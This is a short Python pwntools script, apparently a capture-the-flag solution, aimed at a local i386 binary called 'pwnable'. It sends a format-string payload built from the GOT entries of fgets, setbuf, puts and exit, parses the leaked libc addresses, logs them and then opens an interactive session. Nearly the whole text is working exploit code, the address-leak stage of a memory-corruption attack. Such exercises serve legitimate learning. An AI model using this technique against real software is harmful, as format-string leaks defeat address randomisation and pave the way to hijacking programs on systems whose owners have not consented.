from pwn import *

context(arch="i386",endian="little")
elf = ELF("./pwnable")

#p = gdb.debug(elf.path,'''
#        break *0x8048593
#        continue
#''')
p = process(elf.path)

p.recvuntil("back.\n")


buf = b"AA"
buf += p32(elf.got['fgets'])
buf += p32(elf.got['setbuf'])
buf += p32(elf.got['puts'])
buf += p32(elf.got['exit'])
buf += b".%11$s"
buf += b".%12$s"
buf += b".%13$s"
buf += b".%14$s."

p.sendline(buf)
ret = p.recv()
rets = ret.split(b".")
print(rets)
addr1 = u32(rets[-5][:4])
addr2 = u32(rets[-4][:4])
addr3 = u32(rets[-3][:4])
addr4 = u32(rets[-2][:4])
log.info("fgets = " + hex(addr1))
log.info("setbuf = " + hex(addr2))
log.info("puts = " + hex(addr3))
log.info("exit = " + hex(addr4))

p.interactive()

